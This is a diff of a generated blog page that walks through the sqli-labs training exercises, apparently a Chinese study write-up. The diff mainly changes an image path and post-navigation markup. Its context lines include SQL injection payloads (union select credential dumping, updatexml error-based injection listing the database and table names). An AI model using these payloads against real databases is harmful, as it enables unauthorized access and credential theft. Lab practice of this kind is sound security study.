@@ -500,7 +500,7 @@ union select 1,(select group_concat(concat_ws(0x7e,username,password))from users
 <h2 id="less5-报错注入"><a href="#less5-报错注入" class="headerlink" title="less5 -报错注入"></a>less5 -报错注入</h2><p>闭合方式单引号</p>
 <pre><code class="sql">id=-1’ and updatexml(1,concat(0x7e,database(),0x7e),1)
 </code></pre>
-<p><img src="C:/Users/bamboo/AppData/Roaming/Typora/typora-user-images/image-20220226153516085.png" alt="image-20220226153516085"></p>
+<p><img src="/2022/02/26/0226/11.png" alt="image-20220226153516085"></p>
 <p>爆表名：</p>
 <pre><code class="sql">1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23 --+
 </code></pre>
@@ -768,18 +768,17 @@ information_schema.columns where table_name=&#39;users’and table_schema=databa
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/02/26/0226/">
+                <a href="/2022/02/27/0227/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="sqil-lab less2-5">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                         
-                        <span class="card-title">sqil-lab less2-5</span>
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -789,9 +788,9 @@ information_schema.columns where table_name=&#39;users’and table_schema=databa
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-26
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-27
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -800,7 +799,6 @@ information_schema.columns where table_name=&#39;users’and table_schema=databa
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
